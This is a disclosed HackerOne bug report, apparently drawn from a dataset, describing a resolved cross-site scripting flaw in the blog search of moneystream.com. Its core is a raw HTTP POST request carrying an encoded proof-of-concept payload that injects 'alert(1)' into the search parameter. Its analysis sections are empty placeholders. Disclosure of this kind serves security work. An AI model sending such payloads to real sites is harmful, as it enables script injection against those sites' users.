---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '4276'
original_report_id: '4276'
title: Here is another XSS i got for you
weakness: Cross-site Scripting (XSS) - Generic
team_handle: moneystream
created_at: '2014-03-18T13:33:27.279Z'
disclosed_at: '2014-08-06T20:33:21.606Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 6
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# Here is another XSS i got for you

## Metadata

- HackerOne Report ID: 4276
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: moneystream
- Disclosed At: 2014-08-06T20:33:21.606Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

I ve verified it and it does trigger a JS alert
POST /blog/ HTTP/1.1
Host: moneystream.com
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Referer: https://moneystream.com/blog/
Cookie: TrackingId=d86722a7-b3fc-45a4-87c8-fac0a31cca27
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

s=Search%2bthis%2bwebsite%252671879%3balert(1)%2f%2f593

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
